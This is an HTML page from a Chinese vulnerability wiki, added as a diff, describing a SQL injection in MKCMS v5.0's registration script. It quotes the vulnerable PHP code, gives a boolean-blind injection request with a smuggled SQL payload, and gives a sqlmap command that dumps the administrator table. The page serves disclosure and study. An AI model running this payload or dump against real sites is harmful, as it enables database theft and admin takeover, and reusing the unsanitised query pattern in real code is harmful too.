@@ -1,0 +1,179 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/MKCMS/MKCMS%20v5.0%20_ucenter_reg.php%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>MKCMS v5.0 /ucenter/reg.php前台sql注入漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "MKCMS v5.0 /ucenter/reg.php\u524d\u53f0sql\u6ce8\u5165\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_4" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MKCMS%20v5.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MKCMS%20v5.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MKCMS v5.0 任意密码重置漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F/MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F%20v5.0.5%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F/MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F%20v5.0.5%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MIP建站系统 v5.0.5 SSRF漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="mkcms-v50-ucenterregphpsql">MKCMS v5.0 /ucenter/reg.php前台sql注入漏洞<a class="headerlink" href="#mkcms-v50-ucenterregphpsql" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>MKCMS v5.0</p>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>漏洞出现在<code>/ucenter/reg.php</code>第7-19行:</p>
+<div class="codehilite"><pre><span></span><code>if(isset($_POST[&#39;submit&#39;])){
+$username<span class="w"> </span>=<span class="w"> </span>stripslashes(trim($_POST[&#39;name&#39;]));
+//<span class="w"> </span>检测用户名是否存在
+$query<span class="w"> </span>=<span class="w"> </span>mysql_query(&quot;select<span class="w"> </span>u_id<span class="w"> </span>from<span class="w"> </span>mkcms_user<span class="w"> </span>where<span class="w"> </span>u_name=&#39;$username&#39;&quot;);
+if(mysql_fetch_array($query)){
+echo<span class="w"> </span>&#39;<span class="nt">&lt;script&gt;</span>alert(&quot;用户名已存在，请换个其他的用户名&quot;);window.history.go(-1);<span class="nt">&lt;/script&gt;</span>&#39;;
+exit;
+}
+$result<span class="w"> </span>=<span class="w"> </span>mysql_query(&#39;select<span class="w"> </span>*<span class="w"> </span>from<span class="w"> </span>mkcms_user<span class="w"> </span>where<span class="w"> </span>u_email<span class="w"> </span>=<span class="w"> </span>&quot;&#39;.$_POST[&#39;email&#39;].&#39;&quot;&#39;);
+if(mysql_fetch_array($result)){
+echo<span class="w"> </span>&#39;<span class="nt">&lt;script&gt;</span>alert(&quot;邮箱已存在，请换个其他的邮箱&quot;);window.history.go(-1);<span class="nt">&lt;/script&gt;</span>&#39;;
+exit;
+}
+</code></pre></div>
+
+<p>注册用户名时<code>$username</code>参数传到后台后经过<code>stripslashes()</code>函数处理，而<code>stripslashes()</code>函数的作用是删除<code>addslashes()</code>
+函数添加的反斜杠。这里就很郁闷了，过滤反斜杠干嘛？</p>
+<p>当前页面无输出点，只是返回一个注册/未注册（通过if判断true或者false)，可以使用布尔盲注来解决这个问题</p>
+<p>POC：</p>
+<div class="codehilite"><pre><span></span><code><span class="nf">POST</span> <span class="nn">/ucenter/reg.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
+<span class="na">Host</span><span class="o">:</span> <span class="l">127.0.0.1</span>
+<span class="na">User-Agent</span><span class="o">:</span> <span class="l">Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:65.0) Gecko/20100101 Firefox/65.0</span>
+<span class="na">Accept</span><span class="o">:</span> <span class="l">text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span>
+<span class="na">Accept-Language</span><span class="o">:</span> <span class="l">en</span>
+<span class="na">Accept-Encoding</span><span class="o">:</span> <span class="l">gzip, deflate</span>
+<span class="na">Referer</span><span class="o">:</span> <span class="l">http://127.0.0.1/ucenter/reg.php</span>
+<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>
+<span class="na">Content-Length</span><span class="o">:</span> <span class="l">52</span>
+<span class="na">Connection</span><span class="o">:</span> <span class="l">close</span>
+<span class="na">Cookie</span><span class="o">:</span> <span class="l">PHPSESSID=cb8e6ccde6cf9050972fa9461d606be3</span>
+<span class="na">Upgrade-Insecure-Requests</span><span class="o">:</span> <span class="l">1</span>
+
+<span class="nt">name</span><span class="o">=</span><span class="s">test&#39; AND 1</span><span class="o">=</span><span class="s">1 AND &#39;inject&#39;</span><span class="o">=</span><span class="s">&#39;inject</span><span class="p">&amp;</span><span class="nt">email</span><span class="o">=</span><span class="s">sss%40qq.com</span><span class="p">&amp;</span><span class="nt">password</span><span class="o">=</span><span class="s">ssssss</span><span class="p">&amp;</span><span class="nt">submit</span><span class="o">=</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/MKCMSv5.0_ucenter_reg.php%E5%89%8D%E5%8F%B0%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/media/rId24.jpg" /></p>
+<p>将POC中的数据包保存下来丢给sqlmap跑即可。</p>
+<p>获取管理员账号：</p>
+<div class="codehilite"><pre><span></span><code>sqlmap -r inject.txt -D mkcms -T mkcms_manager --dump
+</code></pre></div>
+
+<h2 id="_4">参考链接<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="https://xz.aliyun.com/t/4189">https://xz.aliyun.com/t/4189</a>#toc-1</p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../MKCMS%20v5.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../MKCMS%20v5.0%20%E4%BB%BB%E6%84%8F%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MKCMS v5.0 任意密码重置漏洞
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../../MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F/MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F%20v5.0.5%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../../MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F/MIP%E5%BB%BA%E7%AB%99%E7%B3%BB%E7%BB%9F%20v5.0.5%20SSRF%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        MIP建站系统 v5.0.5 SSRF漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
